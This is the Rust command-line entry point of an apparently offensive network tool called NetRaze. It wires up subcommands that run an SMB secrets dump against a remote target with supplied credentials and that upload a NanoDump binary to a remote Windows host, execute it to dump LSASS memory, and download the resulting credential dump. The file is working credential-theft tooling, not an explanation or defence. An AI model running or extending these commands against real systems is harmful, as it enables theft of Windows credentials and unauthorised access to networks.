use anyhow::Result;
use clap::{Parser, Subcommand};
use netraze_app::NetRazeApp;
use netraze_config::AppConfig;
use netraze_core::ScanRequest;
use netraze_protocols::smb::{remote_lsass_dump, secrets_dump};
use std::collections::BTreeMap;
use std::path::PathBuf;
use tracing_subscriber::EnvFilter;

#[derive(Debug, Parser)]
#[command(name = "netraze", about = "CLI Rust de NetRaze")]
struct Cli {
    #[command(subcommand)]
    command: Command,
}

#[derive(Debug, Subcommand)]
enum Command {
    Protocols,
    Modules,
    Plan {
        protocol: String,
        #[arg(required = true)]
        targets: Vec<String>,
        #[arg(long)]
        module: Option<String>,
    },
    SecretsDump {
        target: String,
        #[arg(short, long)]
        username: String,
        #[arg(short, long)]
        password: String,
        #[arg(short, long)]
        domain: Option<String>,
    },
    /// Dump LSASS via NanoDump (upload binary, execute, download .dmp).
    LsassDump {
        target: String,
        #[arg(short, long)]
        username: String,
        #[arg(short, long)]
        password: String,
        #[arg(short, long)]
        domain: Option<String>,
        /// Path to the NanoDump binary (nanodump.exe or nanodump.x64.exe).
        #[arg(long)]
        binary: PathBuf,
        /// Where to save the downloaded .dmp file.
        #[arg(long, default_value = "lsass.dmp")]
        output: PathBuf,
        /// NanoDump technique flags, e.g. "--fork" or "--dup" (default: --fork).
        #[arg(long, default_value = "--fork")]
        technique: String,
    },
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .without_time()
        .init();

    let cli = Cli::parse();
    let app = NetRazeApp::bootstrap(AppConfig::default());

    match cli.command {
        Command::Protocols => {
            for protocol in app.protocol_catalog() {
                println!(
                    "{} ({}) port {}",
                    protocol.display_name, protocol.key, protocol.default_port
                );
            }
        }
        Command::Modules => {
            for module in app.module_catalog() {
                println!("{} [{}]", module.key, module.supported_protocols.join(", "));
            }
        }
        Command::Plan {
            protocol,
            targets,
            module,
        } => {
            let plan = app
                .plan_scan(ScanRequest {
                    protocol,
                    raw_targets: targets,
                    selected_module: module,
                    options: BTreeMap::new(),
                })
                .await?;
            println!(
                "plan: protocol={} targets={} threads={} timeout={}s",
                plan.request.protocol,
                plan.request.raw_targets.len(),
                plan.concurrency,
                plan.timeout_seconds
            );
        }
        Command::SecretsDump {
            target,
            username,
            password,
            domain,
        } => {
            secrets_dump(&target, &username, &password, domain.as_deref())
                .await
                .map_err(|e| anyhow::anyhow!(e))?;
        }
        Command::LsassDump {
            target,
            username,
            password,
            domain,
            binary,
            output,
            technique,
        } => {
            let nanodump_bytes = std::fs::read(&binary)
                .map_err(|e| anyhow::anyhow!("cannot read binary {}: {e}", binary.display()))?;
            println!(
                "[*] Uploading {} ({} bytes) to {}",
                binary.display(),
                nanodump_bytes.len(),
                target
            );
            let cred = netraze_protocols::smb::SmbCredential::new(
                &username,
                domain.as_deref().unwrap_or(""),
                &password,
            );
            let result = remote_lsass_dump(
                &target,
                &cred,
                &nanodump_bytes,
                &technique,
                &|line| println!("[nanodump] {line}"),
            )
            .await
            .map_err(|e| anyhow::anyhow!(e))?;

            std::fs::write(&output, &result.dump_bytes)
                .map_err(|e| anyhow::anyhow!("cannot write {}: {e}", output.display()))?;
            println!("[+] {} → {}", result.summary, output.display());
        }
    }

    Ok(())
}
